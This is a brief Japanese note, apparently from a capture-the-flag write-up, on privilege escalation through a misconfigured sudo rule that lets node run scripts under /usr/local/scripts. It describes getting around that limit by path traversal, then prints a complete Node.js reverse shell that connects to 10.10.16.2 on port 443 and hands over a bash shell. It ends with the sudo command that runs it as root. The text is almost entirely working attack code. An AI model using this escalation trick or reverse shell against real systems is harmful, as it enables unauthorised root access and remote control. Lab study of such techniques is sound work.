   - sudo -l
    /usr/local/scripts/に書き込み権限がないときは/usr/local/scripts/../../../で書き込みができるディレクトリまでさかのぼり実行すればできる。
```sh
(ALL) /usr/bin/node /usr/local/scripts/*.js
```
     
- 以下のようなコードで実行可能
```sh
cat /home/angoose/reverseshell.js 

(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/bash", []);
var client = new net.Socket();
client.connect(443, "10.10.16.2", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application from crashing
})();
```

- payload
```sh
sudo /usr/bin/node /usr/local/scripts/../../../..//home/angoose/reverseshell.js
```